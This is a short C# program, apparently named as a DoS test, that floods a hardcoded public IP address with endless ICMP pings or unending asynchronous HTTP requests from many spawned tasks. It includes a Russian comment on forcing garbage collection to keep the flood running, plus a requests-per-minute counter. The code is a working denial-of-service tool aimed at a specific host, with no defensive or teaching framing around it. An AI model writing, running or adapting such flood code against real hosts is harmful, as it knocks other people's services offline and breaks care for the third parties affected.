using System.Net.NetworkInformation;
using System.Net;
using System.Windows;

namespace DosAttacTest
{
    internal class Program
    {
        static int i = 0;
        static void Main(string[] args)
        {
            DoSMethod(true, "95.52.117.148");
        }

        static void DoSMethod(bool IsIP, string da)
        {
            
            IPAddress ip = null;
            Action mainTask = null;
            if (IsIP)
            {
                ip = IPAddress.Parse(da);
                mainTask = new Action(async ()=> await DesktopIp(ip));
            }
            mainTask ??= new Action(async () => await SiteIpDos(ip));


            RequestsPerMinut();
            while (true)
            {
                mainTask();
                i++;
                //Каждые 10000 раз вызываем сборщик мусора, иначе прога будет через минуту своей работы занимать около гигабайта ОЗУ
                if (i % 10000 == 0)
                    Console.WriteLine("10000 requests");
                    GC.Collect();
            }
        }

        private static async Task DesktopIp(IPAddress ip)
        {
            await Task.Run(() =>
            {
                while (true)
                {
                    var ping = new Ping();

                    if (ip != null)
                    {
                        ping.Send(ip);
                        //Console.WriteLine($"{i} Requests");
                    }
                }
            });
        }

        private static async Task SiteIpDos(IPAddress ip)
        {
            await Task.Run(() =>
            {
                while (true)
                {
                    var r = (HttpWebRequest)WebRequest.Create("http://" + ip);
                    
                    r.BeginGetResponse(new AsyncCallback((IAsyncResult res) => { }), null);
                }
            });
        }

        private static async Task RequestsPerMinut()
        {
            await Task.Delay(60000);
            Console.WriteLine(i); /*5775*/
            Console.ReadKey();
        }
    }
}